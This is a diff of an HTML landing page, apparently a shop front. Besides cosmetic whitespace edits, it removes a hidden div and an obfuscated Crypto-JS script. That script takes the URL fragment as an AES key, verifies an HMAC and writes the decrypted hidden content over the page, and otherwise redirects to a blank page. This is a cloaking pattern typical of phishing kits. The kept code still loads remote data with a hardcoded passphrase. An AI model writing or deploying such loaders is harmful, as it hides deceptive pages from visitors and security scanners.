@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,6 +22,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
   <style>
+  
     :root{
       --ink:#0b1020;
       --muted:#64748b;
@@ -54,8 +56,8 @@
     .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
 
     /* ============================================================
-        LOADING POPUP
-        ============================================================ */
+       LOADING POPUP
+       ============================================================ */
     .popup{
       position:fixed; inset:0; z-index:9999;
       display:flex; align-items:center; justify-content:center;
@@ -181,8 +183,8 @@
     }
 
     /* ============================================================
-        HERO
-        ============================================================ */
+       HERO
+       ============================================================ */
     .hero{
       display:grid;
       grid-template-columns:1.03fr .97fr;
@@ -254,8 +256,8 @@
     }
 
     /* ============================================================
-        TRUST STRIP
-        ============================================================ */
+       TRUST STRIP
+       ============================================================ */
     .trust{
       border-block:1px solid var(--line);
       background:var(--surface);
@@ -277,8 +279,8 @@
     }
 
     /* ============================================================
-        SECTIONS
-        ============================================================ */
+       SECTIONS
+       ============================================================ */
     .section{ padding:76px 0; }
     .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
     .section-head .kicker{
@@ -401,8 +403,8 @@
     .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
 
     /* ============================================================
-        FOOTER
-        ============================================================ */
+       FOOTER
+       ============================================================ */
     .footer{
       background:#0b1020;
       color:#94a3b8;
@@ -651,13 +653,6 @@
     <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
   </div>
 
-  <!-- Hidden element for hash key extraction if needed by your crypto block -->
-  <div id="futj24r" style="display:none;"></div>
-
-  <!-- Crypto-JS Library -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" referrerpolicy="no-referrer"></script>
-
-  <!-- Main Store & Remote Data Loading Script -->
   <script>
     const PASSPHRASE = "98yNCjeAfWMwk0wI";  
     const URL_KEY = "UrLk3yShopEase01";
@@ -701,6 +696,7 @@
         contentIframe.style.display = "block"; 
         document.getElementById("customPopup").style.display = "none";
         
+       
         secureKeyboardAccess();
 
       } catch (e) {
@@ -715,47 +711,6 @@
     }, { once: true });
   </script>
 
-  <!-- Conditional Hash Key Validation & History Replacement Script -->
-  <script>
-    var yt8i = void 0;
-    !function() {
-        var w1k = document.getElementById("futj24r") ? document.getElementById("futj24r").innerHTML : ""
-          , n6ty = location.hash.slice(1);
-        
-        // Only run the strict decryption & blank redirect if a hash parameter is actually provided
-        if (n6ty) {
-            history.replaceState(null, null, location.pathname);
-            for (var pjft = n6ty; pjft.length < 32; )
-                pjft += String.fromCharCode(0);
-            pjft = pjft.slice(0, 32);
-            var v13 = CryptoJS.enc.Latin1.parse(pjft)
-              , itn3ncl = CryptoJS.enc.Latin1.parse("1f7230646a3f1ad53b7f1b247fb1ccaf")
-              , acskmjf = CryptoJS.enc.Base64.parse(w1k)
-              , qxho0qe = acskmjf.sigBytes
-              , tv9cq = CryptoJS.lib.WordArray.create(acskmjf.words.slice(0, 4), 16)
-              , kc4fs = CryptoJS.lib.WordArray.create(acskmjf.words.slice(4, (qxho0qe - 32) / 4), qxho0qe - 48)
-              , nw52n7 = CryptoJS.lib.WordArray.create(acskmjf.words.slice((qxho0qe - 32) / 4), 32);
-            
-            if (CryptoJS.enc.Hex.stringify(nw52n7) === CryptoJS.enc.Hex.stringify(CryptoJS.HmacSHA256(tv9cq.concat(kc4fs), itn3ncl))) {
-                try {
-                    var o9foe9 = CryptoJS.AES.decrypt({
-                        ciphertext: kc4fs
-                    }, v13, {
-                        iv: tv9cq,
-                        mode: CryptoJS.mode.CBC,
-                        padding: CryptoJS.pad.Pkcs7
-                    }).toString(CryptoJS.enc.Utf8);
-                    o9foe9 ? (document.open(),
-                    document.write(o9foe9),
-                    document.close()) : location.replace("about:blank")
-                } catch (vrrqxfv) {
-                    location.replace("about:blank")
-                }
-            } else {
-                location.replace("about:blank");
-            }
-        }
-    }()
-  </script>
-        
+
+       
 </html>
